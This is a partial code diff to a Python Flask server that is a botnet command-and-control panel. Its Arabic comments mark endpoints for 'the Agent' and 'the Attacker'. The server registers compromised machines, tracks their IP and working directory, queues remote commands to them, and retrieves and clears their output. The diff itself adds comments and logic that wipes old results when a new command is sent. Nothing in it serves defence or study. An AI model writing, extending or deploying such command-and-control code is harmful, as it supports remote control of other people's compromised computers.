@@ -4,10 +4,12 @@ import json
 
 app = Flask(__name__)
 
-bots = {}
-commands = {}
-results = {}
+# ===== قاعدة البيانات =====
+bots = {}          # bot_id -> {"ip": ip, "last_seen": time, "cwd": path}
+commands = {}      # bot_id -> [list of commands]
+results = {}       # bot_id -> [list of results]
 
+# ===== الصفحة الرئيسية =====
 @app.route('/')
 def index():
     return """
@@ -32,6 +34,7 @@ def index():
     </html>
     """
 
+# ===== APIs للـ Agent =====
 @app.route('/register', methods=['POST'])
 def register():
     data = request.json
@@ -72,13 +75,16 @@ def send_result():
     if bot_id:
         if bot_id in results:
             results[bot_id].append(result)
+        
         if bot_id in bots and new_cwd:
             bots[bot_id]["cwd"] = new_cwd
+        
         if bot_id in bots:
             bots[bot_id]["last_seen"] = time.time()
     
     return jsonify({"status": "ok"})
 
+# ===== APIs للـ Attacker =====
 @app.route('/api/list_bots', methods=['GET'])
 def list_bots():
     now = time.time()
@@ -106,6 +112,11 @@ def send_cmd():
         commands[bot_id] = []
     
     commands[bot_id].append(cmd)
+    
+    # مسح النتائج القديمة عند إرسال أمر جديد
+    if bot_id in results:
+        results[bot_id] = []
+    
     return jsonify({"status": "ok", "message": "Command queued"})
 
 @app.route('/api/get_result/<bot_id>', methods=['GET'])
@@ -113,8 +124,10 @@ def get_result(bot_id):
     if bot_id not in results:
         return jsonify({"results": []})
     
+    # جلب النتائج ومسحها فوراً
     res = results[bot_id].copy()
     results[bot_id] = []
+    
     return jsonify({"results": res})
 
 if __name__ == '__main__':
